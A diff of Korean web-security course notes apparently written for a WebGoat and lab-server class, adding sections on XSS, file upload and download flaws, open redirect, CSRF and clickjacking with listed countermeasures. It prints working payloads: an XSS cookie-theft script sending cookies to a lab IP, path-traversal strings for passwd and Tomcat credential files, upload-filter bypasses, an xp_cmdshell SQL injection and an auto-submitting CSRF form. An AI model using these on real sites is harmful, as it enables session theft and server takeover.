@@ -161,7 +161,7 @@ theFlower go go go!
 * webgoat/webgoat
 
 ### WebGoat 테스트
-* 접근제어 취약점 ( 불충분한 인증, 불충분한 인가 ...)
+* __접근제어 취약점__ ( 불충분한 인증, 불충분한 인가 ...)
     - 공격 방법 : 강제 브라우징(dirbuster), 파라미터 변조, 쿠키 변조
 
 * CRUD METRIX (웹 개발 매커니즘)    # ex) 게시판
@@ -397,7 +397,7 @@ bId,bName,bPass
 
 ### MS-SQL
 * xp_cmdshell : 관리자 권한으로 시스템 명형어를 실행  
-`'; exec master.dbo_xp_cmdshell 'ipconfig /all > D:\wwwroot\board\ip.txt'--`
+`'; exec master.dbo.xp_cmdshell 'ipconfig /all > D:\wwwroot\board\ip.txt'--`
 
 ---
 ## 데이터 평문 전송
@@ -422,7 +422,7 @@ bId,bName,bPass
 * 값이 이미 하드코딩된 경우
 * 404, 403 등 예러페이지가 동일하지 않은 경우
 * 주석처리를 잘하지 못한 경우
-* 클라이언트 사이드에서 필처링하는 겨우
+* 클라이언트 사이드에서 필처링하는 경우
 * 백업 파일을 지우지 않은 경우, 기본 페이지를 지우지 않는 경우
     - test.jsp
     - download.asp.bak
@@ -432,3 +432,195 @@ bId,bName,bPass
 * db에러메시지
 * db에 중요정보를 암호화하지 않고 저장하는 경우
 * 등등등
+
+---
+## XSS(크로스 사이트 스트립팅:Cross Site Scriptiong)
+* 취약점이 있는 웹사이트에 방문한 사용자의 웹 브라우저에서 악의적이 HTML 태그나 자바스크립트가 동작하는 공격
+    - 클라이언트 공격
+* 영향
+    - 쿠키훔티기(쿠키 재생 공격)
+    - 악성코드 주소 삽입
+    - 악성사이트로 이동
+    - 페이지 변조
+    - 브라우저 원격제어
+* 대응 방안
+    - 특수문자(<,>,= 등)를 안전한 문자로 치환함
+
+==========================================
+### 반사 XSS
+* 서버가 외부에서 입력받은 값을 받아 브라우저에게 응답할 때 전송하는 과정에서 클라이언트가 입력한 파라미터의 위험한 문자를 그대로 들려주면서 발생함
+* 보통 검색창에서 많이 발생함
+* 웹 사이트에 보내는 모든 파라미터에 가능할 수 있음
+* 보통 피싱에 많이 사용함
+
+### 저장 XSS
+* 저장 XSS 취약점이 존재하는 웹서버에 악성스크립츠를 영구적으로 저장하는 방법
+* 보통 게시판 글, 댓글, 개인정보수정 페이지
+
+```
+"><script>alert("xss")</script>
+'><script>alert("xss")</script>
+
+`"><marquee>text` -> xss 공격이라하기는 좀 약함
+
+<img src=@ onerror=alert("xss");>
+<img src=@ onerror=alert(1234);>
+
+<video src="1" onerror=document.location="http://naver.com">
+
+<iframe src='http://chol.com' width=0 height=0></iframe>
+<script>document.write ("<iframe src='http://www.sam60.xo.st' width=100 height=100></iframe>")</script>
+<iframe src='https://www.msn.com' width=100 height=100></iframe>
+
+<script>document.location.href="http://www.naver.com"</script>
+```
+* 검색하면 xss 공격 코드가 많음
+    - google xss payload inurl:github
+
+### 쿠키 탈취 실습  
+1. 쿠키에 접근가능하지, 그리고 XSS가 가능한지 확인  
+`<script>alert(document.cookie)</script>`    
+
+2. iframe 태그를 이용한 공격  
+`<script>document.write("<iframe src='http://70.12.113.49:8081/XSSAttack/1.asp?cookie="+document.cookie+"' width=0 height=0></iframe>")</script>`   
+
+3. 확인  
+`http://70.12.113.49:8081/XSSAttack/attack_cookie.txt`  
+
+---
+## 파일 업로드 취약점
+* 정상적인 파일이 아닌 악의적인 악성크드(예: 웹쉘)가 서버에 업로드 가능하여 서버권한 탈취 등 서버에 피해를 끼치는 취약점
+* 업로드, 접근, 실행이 가능해야 공격 가능
+* 교재 -> p275
+
+* 대응 방안
+    - ../ 필터링
+    - 업로드되는 URL지점에서 실행권한을 제한
+    - 업로드되는 파일의 이름을 바꿈
+    - 화이트리스트 방식으로 업로드 확장자 제한
+    - __업로드 금지__
+```
+./   ../   ../../   ../../../
+../../download/
+
+.\  ..\  .\  ..\
+..\..\..\
+
+----------------------------------
+*.asp : cer asa cds cdx
+*.php : php3 php4 php5 html hum phtml inc
+*.jsp : war jsf
+
+asp.net  : aspx, asax,ascx,ashx,axd,asmx,config,cs,csproj,licx,rem,resources, resx, soap, vb, vbproj, vsdisco, webinfo 등
+
+.php::%data
+.php%00.jpg asp%0a.jpg
+.php;.jpg   asp;.jpg
+
+php 전용 취약점 : .php.kr
+
+.js%70 %2ejsp   # %2e: .(점)  
+```
+
+---
+## 파일 다운로드 공격
+* 접근이 제한되어야 할 파일에 접근하여 다운로드 할 수 있는 취약점
+* /etc/passwd, 운영체제의 중요파일, 중요한 설정 파일, asp,php,jsp같은 소스코드
+* 공격 방법
+    - 파라미터의 url 경로를 변조하여 다운로드 시도
+
+* 다운로드 방식
+    - url 값        # 이건 '접근제어 취약점'
+    - 숫자값
+    - 파일 이름     # 이것만 가능
+* 대응 방안
+    1. ../ ..\ 필터링
+    2. 파일다운로드 모듈 구현시 실제 파일경로는 DB에 저장하도록하고 사용자게게 노출되는 URI의 파라미터에는 인덱그 번호를 통해 다운로드할 파일을 표시함
+        - '접근 제어 취약점'이 될수 있으나, 세션을 확인하게 만들면 됨
+```
+../../etc/hosts
+../../Windows/System32/drivers/etc/hosts
+..\..\Windows\System32\driversetc\hosts
+../../../WINNT/System32/drivers/etc/hosts
+
+/../../../../
+./.././.././../etc/./passwd
+.../.../..//.../.../..//
+....//....//....//....//
+```
+```
+과제 : chapter1게시판에서 down.asp를 다운로드취약점을 이용하여 다운로드하여 down.asp의 소스코드를 확인하라!!
+
+../../../../../chapter1/down.asp
+
+chapter1/upload/upload/upload/upload/shellw(2).asp
+
+http://70.12.113.49:8081/chapter1/upload/upload/upload/upload/shellw(2).asp
+```
+
+`../../../../tomcat/conf/tomcat-users.xml`  
+
+* LFI(Local file inclusion)
+    - 자기 서버 파일 포함
+* RFI(Remote file inclusion)
+    - 다른 서버 파일
+* 훔처본 파일이 실행이 되는 소스코드이면 위험함
+
+---
+## URI = URL + URN
+* URI(Uniform Resource Identifier))
+* URL(Uniform Resource Locator)
+* URN((Uniform Resource Name) 
+
+---
+## 리다이렉트 춰약점
+* http://naver.com?url=daum.net
+    - http://naver.com?url=피싱사이트url
+
+---
+## 히든필드
+* 일반적으로 보이지 않는 파라미터 값
+
+---
+## CSRF (Cross-Site Request Forgery)
+* 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위를 특정 __웹서버__에 요청하게 하는 공격
+    - 서버에 요청
+
+* CSRF 취약점 진단 방법
+    - 웹사이트에 XSS 취약점이 있는지 확인하고 불충분한 인증이 있는지 확인
+* 참고 : CSRF에 XSS취약점은 필수는 아니지만 국내에서는 XSS 취약점이 필요한 것으로 보통 생각하는 편임
+
+* 대응 방법
+    - XSS 공격 대응방안과 유사
+    - 강력한 인증을 한다.
+
+* CSRF 실습
+```
+- GET 방식
+<img src="http://target.com?param=1">
+<iframe src="http://target.com?param=1">
+
+- Aotopostion Form 방식(POST 요청방식)
+---------------------------------------
+POST /member/mem_modify_ok.asp HTTP/1.1
+Host: 70.12.113.49:8081
+
+pwd=1111&name=%B0%AD%BB%E7&email=1111
+
+-======================================
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://70.12.113.49:8081/member/mem_modify_ok.asp' target="csrf-frame" id="csrf-form">
+<input type="hidden" name="pwd" value="1234"/>
+<input type="hidden" name="name" value="angel"/>
+<input type="hidden" name="email" value="angel@angel.com"/>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+```
+* 대응 방법
+    - XSS 공격 대응방안과 유사
+    - 강력한 인증을 한다.
+
+------------------------------
+## 클릭 재킹 (XSS와 유사하지만 위험도 낮음)
+`<a href="http://wwww.naver.com">네이버로이동</a>`  
+`<a onmouseup=window.open("http://www.daum.net") href="http://www.naver.com">네이버로이동</a>`  
